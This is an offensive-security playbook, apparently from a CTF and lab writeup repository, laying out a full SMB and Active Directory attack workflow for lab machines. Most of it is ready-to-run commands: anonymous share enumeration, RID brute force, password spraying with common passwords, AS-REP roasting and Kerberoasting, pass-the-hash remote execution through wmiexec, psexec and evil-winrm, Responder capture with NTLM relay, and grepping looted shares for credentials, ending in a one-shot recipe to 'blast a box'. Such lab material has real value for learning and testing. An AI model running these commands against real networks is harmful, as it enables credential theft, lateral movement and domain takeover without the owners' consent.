# SMB Enumeration Playbook

End-to-end SMB enumeration workflow: unauthenticated triage  authenticated share walk  user / RID / policy enumeration  file-level hunt. Commands marked **[USED]** appear in the writeups in this repo.

Used on: **Overwatch**, **SoupedeCode 01**, **VulnNet: Internal**, **Relevant**, **Wreath**

For anonymous-specific tricks (null / guest), also see [smb-anonymous-enum.md](smb-anonymous-enum.md).

---

## 0. Port Surface

SMB is the cluster of ports:

| Port | Purpose |
|------|---------|
| 139/tcp | NetBIOS Session Service (legacy SMB over NetBIOS) |
| 445/tcp | SMB direct |
| 137/udp | NetBIOS Name Service |
| 138/udp | NetBIOS Datagram |

```bash
nmap -sS -p139,445 $TARGET                                 # [USED]
nmap -sV -p139,445 --script smb-protocols,smb-os-discovery,smb2-security-mode,smb-enum-shares,smb-enum-users $TARGET
nmap --script "safe and smb-*" -p139,445 $TARGET
```

`smb-os-discovery` usually returns a hostname, Windows version and domain name — feed all of these into `/etc/hosts`.

---

## 1. Banner & Signing

```bash
netexec smb $TARGET                                        # [USED]
```

What to read off the banner line:

| Output | Meaning |
|--------|---------|
| `signing:True (enabled+required)` | SMB-signing-required: NTLM relay blocked |
| `signing:False` / `signing:False (enabled)` | Relay-candidate |
| `SMBv1:True` | EternalBlue-era bugs possible (MS17-010) |
| Domain / workgroup name | Feeds /etc/hosts, BloodHound |

EternalBlue quick-check:
```bash
nmap -p445 --script smb-vuln-ms17-010 $TARGET
```

---

## 2. Anonymous / Guest Triage

```bash
# Null
netexec smb $TARGET -u '' -p '' --shares                    # [USED]
smbclient -N -L //$TARGET/                                  # [USED — VulnNet: Internal]

# Guest
netexec smb $TARGET -u 'guest' -p '' --shares               # [USED — SoupedeCode 01]
smbclient -N //$TARGET/shares                               # [USED — VulnNet: Internal]
```

Outputs to note:

| Column | What to do |
|--------|------------|
| `READ` | Try to enumerate + download everything |
| `WRITE` | Think about authorized_keys / payload drop (per-share) |
| `STATUS_ACCESS_DENIED` | Still probe individual shares by name (`\software$`, `\backup`) |

### Full enum4linux sweep
```bash
enum4linux -a $TARGET                                       # [USED — VulnNet, SoupedeCode]
```

`-a` runs users + shares + groups + password policy + RIDs + OS info. Fast on a box, noisy for anything production.

---

## 3. Authenticated Share Walk

Once you have credentials:

```bash
netexec smb $TARGET -u <USER> -p '<PASS>' --shares          # [USED — Logging, Overwatch]
smbmap -H $TARGET -u <USER> -p '<PASS>' -r                  # [USED — SoupedeCode 01]
smbclient -L //$TARGET/ -U '<USER>%<PASS>'
```

### Download a whole share
```bash
smbclient //$TARGET/SHARE -U '<USER>%<PASS>' \
  -c "recurse ON; prompt OFF; cd <subpath>; mget *"          # [USED — Overwatch SYSVOL]
```

### Files always worth grabbing

| Share / file | Why |
|-------|-----|
| `SYSVOL\<domain>\Policies\**\Groups.xml` | GPP `cpassword` (decryptable) |
| `SYSVOL\<domain>\scripts\*.ps1 / *.vbs / *.bat` | Scripts with creds / paths |
| `NETLOGON\*` | Same, often overlaps SYSVOL\scripts |
| `IPC$` | Pipes, used by RPC below |
| `Logs`, `Audit`, `Transcripts` | Plaintext dumps — e.g. Logging's `\Logs` |
| `Backup`, `Archive`, `Old` | Stale credentials — SoupedeCode's `\backup` with machine hashes |
| `Users`, `Profiles$` | `.rdp`, `.ssh`, `.bash_history` (yes, on Windows too) |
| Dev / custom-named shares | Source code, `.env`, CI artefacts |

---

## 4. RPC over `IPC$`

When you have at least guest or a valid user, LSA / SAMR over `IPC$` gives user / group / policy info without file shares.

### rpcclient
```bash
rpcclient -U '<USER>%<PASS>' $TARGET
> enumdomusers                                              # requires SAMR access
> enumdomgroups
> querygroup 0x200                                          # group by RID (0x200 = Domain Admins)
> queryuser <RID>
> getdompwinfo
> lookupnames administrator                                  # returns SID  base RID
> lookupsids <SID>
```

### netexec full user / group enum
```bash
netexec smb $TARGET -u <USER> -p '<PASS>' --users
netexec smb $TARGET -u <USER> -p '<PASS>' --groups
netexec smb $TARGET -u <USER> -p '<PASS>' --loggedon-users
netexec smb $TARGET -u <USER> -p '<PASS>' --pass-pol
```

### RID brute (guest / null path when `enumdomusers` is blocked)
```bash
netexec smb $TARGET -u guest -p '' --rid-brute              # [USED — SoupedeCode 01]
impacket-lookupsid guest@$TARGET
```

See [RID brute-force playbook](rid-brute-enumeration.md).

---

## 5. Password Spraying

### User == password
```bash
nxc smb $TARGET -u usernames.txt -p usernames.txt \
  --no-brute --continue-on-success                          # [USED — SoupedeCode 01]
```

### Common policy passwords
```bash
nxc smb $TARGET -u usernames.txt -p 'Welcome123' --continue-on-success
nxc smb $TARGET -u usernames.txt -p 'Password1' --continue-on-success
nxc smb $TARGET -u usernames.txt -p 'Summer2025!' --continue-on-success
```

### Kerbrute (less noisy for account lockout — AS-REQ pre-auth only)
```bash
kerbrute passwordspray --dc $TARGET -d <DOMAIN> usernames.txt 'Welcome2026@'
```

See [password-spraying.md](password-spraying.md).

---

## 6. AS-REP Roast / Kerberoast (once you have one valid account)

```bash
impacket-GetNPUsers -dc-ip $TARGET <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile asreproast.txt

impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip $TARGET -request -output hashes.txt      # [USED — SoupedeCode 01]
```

See [kerberos-roasting.md](kerberos-roasting.md).

---

## 7. Pass-the-Hash / Over-PTH

With an NT hash instead of a password:

```bash
netexec smb $TARGET -u <USER> -H ':<NT_HASH>' --shares
smbclient //$TARGET/SHARE -U '<DOMAIN>\<USER>' --pw-nt-hash '<NT_HASH>'
impacket-wmiexec -hashes ':<NT_HASH>' <DOMAIN>/<USER>@$TARGET        # [USED — SoupedeCode 01]
impacket-psexec -hashes ':<NT_HASH>' <DOMAIN>/<USER>@$TARGET
evil-winrm -i $TARGET -u '<USER>' -H '<NT_HASH>'                    # [USED — Logging]
```

---

## 8. SMB Signing / Relay (when signing is False)

Respond on a name, capture NetNTLMv2, relay:

```bash
# Capture
sudo responder -I <iface>                                            # [USED — Overwatch]

# Relay to a host that does NOT require signing
impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server
```

---

## 9. File-Level Hunt on Downloaded Loot

After mirroring a share locally:

```bash
# Credential hunt
grep -rEi 'password|passwd|pwd|secret|token|connectionstring' ./loot/

# GPP cpassword
grep -r 'cpassword' ./loot/
gpp-decrypt '<cpassword_value>'

# Hardcoded creds in binaries
strings -n 6 ./loot/*.exe | grep -iE 'pass|token|user'

# Config files
find ./loot -iname "*.xml" -o -iname "*.config" -o -iname "*.ini" -o -iname "*.env"
```

See [binary-credential-hunting.md](../creds/binary-credential-hunting.md).

---

## 10. Quick Wins Cheat Sheet

| Symptom | Follow-up |
|---------|-----------|
| `signing:False` | Responder + ntlmrelayx |
| SMBv1 enabled | MS17-010 check |
| Guest works | RID brute + spraying |
| `Logs` or `Audit` share readable | Grep for cleartext creds (Logging) |
| `\backup` share + machine hashes | PTH as computer account (SoupedeCode) |
| SYSVOL readable | `Groups.xml` cpassword, script creds |
| Any valid user | AS-REP + Kerberoast, BloodHound |
| SPN on user account with weak pw | `-m 13100` hashcat |
| ACL path in BloodHound | Shadow Credentials / RBCD |

---

## 11. One-Shot Recipe

Use this when you just want to blast a box:

```bash
TARGET=<ip>; DOMAIN=<domain>; USER=<user>; PASS=<pass>

# 1. Banner + null
nmap -sV -p139,445 --script smb-os-discovery,smb-protocols,smb2-security-mode $TARGET
netexec smb $TARGET
netexec smb $TARGET -u '' -p '' --shares

# 2. Guest
netexec smb $TARGET -u guest -p '' --shares
netexec smb $TARGET -u guest -p '' --rid-brute > rid.txt

# 3. User-level triage
netexec smb $TARGET -u $USER -p "$PASS" --shares
netexec smb $TARGET -u $USER -p "$PASS" --users
netexec smb $TARGET -u $USER -p "$PASS" --loggedon-users
netexec smb $TARGET -u $USER -p "$PASS" --pass-pol

# 4. AS-REP + Kerberoast
impacket-GetNPUsers -dc-ip $TARGET $DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt
impacket-GetUserSPNs $DOMAIN/$USER:"$PASS" -dc-ip $TARGET -request -output tgs.txt

# 5. BloodHound
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -dc <DC_FQDN> -ns $TARGET -c All --zip
```

---

## Related
- [SMB anonymous enumeration](smb-anonymous-enum.md)
- [RID brute-force](rid-brute-enumeration.md)
- [Password spraying](password-spraying.md)
- [AS-REP Roast & Kerberoast](kerberos-roasting.md)
- [Shadow Credentials](shadow-credentials.md)
- [NTLM capture & crack](ntlm-capture-crack.md)
- [ADIDNS poisoning](adidns-poisoning.md)
- [Windows enumeration](../enumeration/windows-enumeration.md)


